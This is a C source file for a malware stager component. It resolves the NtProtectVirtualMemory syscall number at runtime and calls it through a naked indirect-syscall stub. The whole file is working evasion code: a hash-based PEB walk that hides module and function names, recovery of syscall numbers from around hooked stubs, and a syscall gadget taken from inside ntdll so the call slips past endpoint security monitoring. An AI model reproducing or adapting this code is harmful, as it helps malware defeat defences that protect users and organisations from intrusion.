/*
 * hellshall.c — runtime SSN resolver + naked syscall stub.
 *
 * Design:
 *  - PEB walk (gs:[0x60]) → InLoadOrderModuleList → BaseDllName hash match
 *    for ntdll.dll. No "ntdll.dll" string in .rdata; only the djb2 constant.
 *  - Parse ntdll export directory, hash each name, match target.
 *  - Extract SSN from stock prologue bytes 4C 8B D1 B8 <ssn:16> 00 00.
 *  - If the target is inline-hooked (0xE9 first byte), scan neighbouring
 *    32-byte-aligned stubs; ntdll exports syscalls in SSN order, so a clean
 *    stub 'idx' entries away has SSN ± idx relative to ours.
 *  - Gadget: scan 0xFF..0x1FE bytes past the target for the 0F 05 syscall
 *    opcode inside some other Nt* — the jmp target rotates by process.
 *
 * The naked stub jumps (not calls) to the gadget; the gadget's `ret` returns
 * directly to our caller in stager.c.
 */

#include <windows.h>
#include "hellshall.h"

/* ── Minimal PEB / LDR shapes (avoid winternl.h coupling) ─────────────────── */

typedef struct _UNICODE_STR_M {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STR_M;

typedef struct _LIST_ENTRY_M {
    struct _LIST_ENTRY_M *Flink;
    struct _LIST_ENTRY_M *Blink;
} LIST_ENTRY_M;

typedef struct _LDR_ENTRY_M {
    LIST_ENTRY_M   InLoadOrderLinks;
    LIST_ENTRY_M   InMemoryOrderLinks;
    LIST_ENTRY_M   InInitializationOrderLinks;
    PVOID          DllBase;
    PVOID          EntryPoint;
    ULONG          SizeOfImage;
    UNICODE_STR_M  FullDllName;
    UNICODE_STR_M  BaseDllName;
} LDR_ENTRY_M;

typedef struct _PEB_LDR_M {
    ULONG        Length;
    BOOLEAN      Initialized;
    HANDLE       SsHandle;
    LIST_ENTRY_M InLoadOrderModuleList;
} PEB_LDR_M;

typedef struct _PEB_M {
    BYTE         Reserved[0x18];
    PEB_LDR_M   *Ldr;
} PEB_M;

/* ── djb2 hash constants (precomputed, name strings never appear in .rdata) ─ */

#define H_NTDLL      0x22d3b5edU   /* djb2("ntdll.dll") lowercase              */
#define H_NTPROTECT  0x082962c8U   /* djb2("NtProtectVirtualMemory") ascii     */

/* ── Global config populated by FetchNtProtectSyscall ─────────────────────── */

DWORD g_NtProtectSSN;
PVOID g_NtProtectGadget;

/* ── Hash helpers ─────────────────────────────────────────────────────────── */

static DWORD djb2_wide_lower(const WCHAR *s, USHORT bytes)
{
    DWORD h = 5381;
    USHORT n = bytes / (USHORT)sizeof(WCHAR);
    for (USHORT i = 0; i < n; i++) {
        WCHAR c = s[i];
        if (c >= L'A' && c <= L'Z') c = (WCHAR)(c + 0x20);
        h = ((h << 5) + h) + (BYTE)c;
    }
    return h;
}

static DWORD djb2_ascii(const CHAR *s)
{
    DWORD h = 5381;
    while (*s) {
        h = ((h << 5) + h) + (BYTE)*s++;
    }
    return h;
}

/* ── PEB walk: find ntdll.dll base by hashed BaseDllName ──────────────────── */

static PVOID find_ntdll_base(void)
{
    PEB_M *peb = (PEB_M *)__readgsqword(0x60);
    if (!peb || !peb->Ldr) return NULL;

    LIST_ENTRY_M *head = &peb->Ldr->InLoadOrderModuleList;
    for (LIST_ENTRY_M *cur = head->Flink; cur && cur != head; cur = cur->Flink) {
        LDR_ENTRY_M *e = (LDR_ENTRY_M *)cur;  /* InLoadOrderLinks is first */
        if (!e->BaseDllName.Buffer || !e->BaseDllName.Length) continue;
        if (djb2_wide_lower(e->BaseDllName.Buffer, e->BaseDllName.Length) == H_NTDLL)
            return e->DllBase;
    }
    return NULL;
}

/* ── Extract SSN from a clean stub, or scan neighbours if hooked ──────────── */

static BOOL extract_ssn(BYTE *stub, DWORD *out_ssn)
{
    /* Clean prologue: 4C 8B D1 B8 lo hi 00 00 */
    if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 &&
        stub[3] == 0xB8 && stub[6] == 0x00 && stub[7] == 0x00) {
        *out_ssn = ((DWORD)stub[5] << 8) | stub[4];
        return TRUE;
    }

    /* Hooked: walk 32-byte-aligned neighbours. ntdll exports syscalls in
     * SSN order; a clean stub 'idx' entries down has our SSN + idx. */
    for (int idx = 1; idx <= 500; idx++) {
        BYTE *down = stub + (idx * 32);
        BYTE *up   = stub - (idx * 32);

        if (down[0] == 0x4C && down[1] == 0x8B && down[2] == 0xD1 &&
            down[3] == 0xB8 && down[6] == 0x00 && down[7] == 0x00) {
            DWORD ssn = ((DWORD)down[5] << 8) | down[4];
            *out_ssn = ssn - (DWORD)idx;
            return TRUE;
        }
        if (up[0] == 0x4C && up[1] == 0x8B && up[2] == 0xD1 &&
            up[3] == 0xB8 && up[6] == 0x00 && up[7] == 0x00) {
            DWORD ssn = ((DWORD)up[5] << 8) | up[4];
            *out_ssn = ssn + (DWORD)idx;
            return TRUE;
        }
    }
    return FALSE;
}

/* ── Public: resolve NtProtectVirtualMemory SSN + gadget ──────────────────── */

BOOL FetchNtProtectSyscall(void)
{
    BYTE *base = (BYTE *)find_ntdll_base();
    if (!base) return FALSE;

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    DWORD exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exp_rva) return FALSE;

    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(base + exp_rva);
    DWORD *names = (DWORD *)(base + exp->AddressOfNames);
    DWORD *funcs = (DWORD *)(base + exp->AddressOfFunctions);
    WORD  *ords  = (WORD  *)(base + exp->AddressOfNameOrdinals);

    BYTE *target = NULL;
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const CHAR *name = (const CHAR *)(base + names[i]);
        if (djb2_ascii(name) == H_NTPROTECT) {
            target = base + funcs[ords[i]];
            break;
        }
    }
    if (!target) return FALSE;

    DWORD ssn = 0;
    if (!extract_ssn(target, &ssn)) return FALSE;
    g_NtProtectSSN = ssn;

    /* Gadget: 0F 05 (syscall) within 0xFF bytes of target+0xFF. Lands inside
     * some other Nt* stub, so the syscall executes from ntdll .text. */
    BYTE *scan = target + 0xFF;
    for (int z = 0; z <= 0xFF; z++) {
        if (scan[z] == 0x0F && scan[z + 1] == 0x05) {
            g_NtProtectGadget = (PVOID)(scan + z);
            break;
        }
    }
    return g_NtProtectGadget != NULL;
}

/* ── Naked syscall stub ───────────────────────────────────────────────────── *
 * MS x64 ABI already puts args 1-4 in rcx/rdx/r8/r9 and args 5+ at [rsp+0x28].
 * Syscall ABI wants arg1 in r10 (rcx is clobbered by the syscall itself), SSN
 * in eax, everything else identical — so we just relocate rcx→r10, load SSN,
 * jmp to the gadget. The gadget's `ret` returns to our C caller.               */

__attribute__((naked)) NTSTATUS HhNtProtectVirtualMemory(HANDLE ProcessHandle,
                                                        PVOID *BaseAddress,
                                                        PSIZE_T RegionSize,
                                                        ULONG NewProtect,
                                                        PULONG OldProtect)
{
    __asm__(
        "movq  %rcx, %r10\n\t"
        "movl  g_NtProtectSSN(%rip), %eax\n\t"
        "jmpq  *g_NtProtectGadget(%rip)\n\t"
    );
}
